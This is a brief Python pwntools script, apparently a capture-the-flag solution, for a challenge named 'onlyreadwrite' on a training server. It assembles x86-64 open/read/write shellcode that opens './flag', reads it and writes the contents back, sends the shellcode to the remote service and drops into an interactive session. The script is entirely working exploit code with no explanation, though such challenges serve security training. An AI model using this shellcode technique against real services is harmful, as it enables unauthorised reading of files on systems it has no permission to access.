from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#r = process("./onlyreadwrite")
#gdb.attach(r,'''
#b * 0x00401551
#''')
#input("wait")
r = remote("bin.training.offdef.it", 2006)

asm_code = """
mov r12, rax
mov rax, 2
mov rdi, r12
add rdi, 0x62
mov rsi, 0
mov rdx, 0
mov r10, 0
syscall
mov rdi, rax
mov rax, 0
mov rsi, r12
add rsi, 0x100
mov rdx, 0x40
syscall
mov rdx, rax
mov rax, 1
mov rdi, 1
mov rsi, r12
add rsi, 0x100
syscall
"""


context.arch = 'amd64'
stringa = "/bin/sh"


shellcode = asm(asm_code)

r.send(shellcode + (b"./flag"))

r.interactive()